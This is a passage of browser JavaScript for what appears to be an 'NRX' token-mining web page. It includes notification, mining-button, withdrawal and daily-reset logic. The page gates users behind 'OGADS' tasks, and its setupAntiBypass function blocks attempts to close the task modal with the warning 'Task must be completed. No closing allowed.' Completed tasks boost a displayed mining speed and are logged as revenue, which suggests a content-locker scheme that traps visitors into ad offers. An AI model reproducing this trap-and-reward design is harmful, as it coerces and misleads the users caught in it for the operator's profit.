            const modal = document.getElementById('secure-task-modal');
            if (modal) modal.remove();
            const overlay = document.getElementById('tab-protection-overlay');
            if (overlay) overlay.remove();
            
            // Re-enable mining button
            if (this.domCache.startMiningBtn) {
                this.domCache.startMiningBtn.disabled = false;
            }
        });
    }

    showSuccessNotification(oldSpeed, newSpeed, boost) {
        this.showNotification(`✅ Task completed! Speed boosted: ${oldSpeed} → ${newSpeed} H/s (+${boost})`, 'success');
    }

    showNotification(message, type = 'info') {
        requestAnimationFrame(() => {
            const notification = document.createElement('div');
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: ${type === 'success' ? '#27ae60' : 
                           type === 'error' ? '#e74c3c' : 
                           type === 'warning' ? '#f39c12' : '#2a4b8d'};
                color: white;
                padding: 15px 25px;
                border-radius: 5px;
                z-index: 10001;
                animation: slideIn 0.3s ease;
                display: flex;
                align-items: center;
                gap: 10px;
                max-width: 400px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            `;
            
            notification.innerHTML = `
                <i class="fas fa-${type === 'success' ? 'check-circle' : 
                                  type === 'error' ? 'exclamation-circle' : 
                                  'info-circle'}"></i>
                <span>${message}</span>
            `;
            
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.animation = 'slideOut 0.3s ease forwards';
                setTimeout(() => notification.remove(), 300);
            }, 5000);
        });
    }

    showSecurityWarning(message) {
        this.showNotification(`⚠️ ${message}`, 'warning');
    }

    setupEventListeners() {
        // Mining button - ADD DEBOUNCING
        if (this.domCache.startMiningBtn) {
            this.domCache.startMiningBtn.addEventListener('click', () => {
                // Debounce: prevent multiple rapid clicks
                if (this.domCache.startMiningBtn.disabled) return;
                this.domCache.startMiningBtn.disabled = true;
                
                setTimeout(() => {
                    this.domCache.startMiningBtn.disabled = false;
                }, 500);
                
                if (this.state.isMining) {
                    this.stopMining();
                } else {
                    this.startMining();
                }
            }, { passive: true });
        }
        
        // Withdraw button
        if (this.domCache.withdrawBtn) {
            this.domCache.withdrawBtn.addEventListener('click', () => {
                this.processWithdrawal();
            }, { passive: true });
        }
        
        // Confirm withdrawal
        if (this.domCache.confirmWithdrawalBtn) {
            this.domCache.confirmWithdrawalBtn.addEventListener('click', () => {
                this.confirmWithdrawal();
            }, { passive: true });
        }
        
        // Close modals
        const closeButtons = document.querySelectorAll('.close');
        closeButtons.forEach(btn => {
            btn.addEventListener('click', (e) => {
                const modal = e.target.closest('.modal');
                if (modal) modal.style.display = 'none';
            }, { passive: true });
        });
        
        // Auto-save every 30 seconds - ASYNCHRONOUS
        setInterval(() => {
            setTimeout(() => this.saveState(), 0);
        }, 30000);
    }

    setupAntiBypass() {
        document.addEventListener('click', (e) => {
            if (this.state.isOGADSActive && 
                (e.target.classList.contains('modal') || 
                 e.target.classList.contains('close'))) {
                e.preventDefault();
                this.showSecurityWarning('Task must be completed. No closing allowed.');
            }
        }, { passive: false });
    }

    setupVisibilityHandlers() {
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                this.state.tabHidden = true;
                if (this.state.isMining) {
                    this.stopMining();
                    this.showNotification('⏸️ Mining paused - tab switched', 'warning');
                }
            } else {
                this.state.tabHidden = false;
            }
        }, { passive: true });
    }

    saveState() {
        try {
            localStorage.setItem('nrx_security_state', JSON.stringify(this.state));
            this.state.lastSaveTime = Date.now();
            return true;
        } catch (e) {
            console.error('Save failed:', e);
            return false;
        }
    }

    loadState() {
        try {
            const saved = localStorage.getItem('nrx_security_state');
            if (saved) {
                const parsed = JSON.parse(saved);
                if (parsed.dailyResetDate === this.getTodayDateString()) {
                    Object.assign(this.state, parsed);
                    return true;
                } else {
                    this.resetDailyStats();
                }
            }
        } catch (e) {
            console.error('Load failed:', e);
        }
        return false;
    }

    resetDailyStats() {
        this.state.minedToday = 0;
        this.state.withdrawalsToday = 0;
        this.state.miningCyclesCompleted = 0;
        this.state.completedTasks = [];
        this.state.taskRewardsEarned = 0;
        this.state.dailyResetDate = this.getTodayDateString();
        setTimeout(() => this.saveState(), 0);
    }

    checkDailyReset() {
        const today = this.getTodayDateString();
        if (this.state.dailyResetDate !== today) {
            this.resetDailyStats();
        }
    }

    updateUI() {
        requestAnimationFrame(() => {
            if (this.domCache.minedTokens) {
                this.domCache.minedTokens.textContent = this.state.minedToday.toFixed(4) + ' NRX';
            }
            if (this.domCache.miningSpeed) {
                this.domCache.miningSpeed.textContent = this.state.miningSpeed + ' H/s';
            }
            
            // Update mining button
            if (this.domCache.startMiningBtn) {
                if (this.state.isMining) {
                    this.domCache.startMiningBtn.innerHTML = '<i class="fas fa-pause"></i> Stop Mining';
                    this.domCache.startMiningBtn.classList.remove('btn-primary');
                    this.domCache.startMiningBtn.classList.add('btn-warning');
                } else {
                    this.domCache.startMiningBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining Now';
                    this.domCache.startMiningBtn.classList.remove('btn-warning');
                    this.domCache.startMiningBtn.classList.add('btn-primary');
                    this.domCache.startMiningBtn.disabled = this.state.isOGADSActive;
                }
            }
        });
    }

    recordRevenue(amount) {
        this.state.revenueHistory.push({
            timestamp: Date.now(),
            amount: amount,
            type: 'task_completion'
        });
    }

    generateSessionId() {
        return 'nrx_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    getTodayDateString() {
        const today = new Date();
        return `${today.getFullYear()}-${today.getMonth() + 1}-${today.getDate()}`;
    }
}

// ===== INSTANTIATE AND EXPORT =====
// Make it globally available
document.addEventListener('DOMContentLoaded', () => {
    window.nrxSecurity = new NRXSecuritySystem();
}, { once: true });

// Add CSS animations for notifications
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);
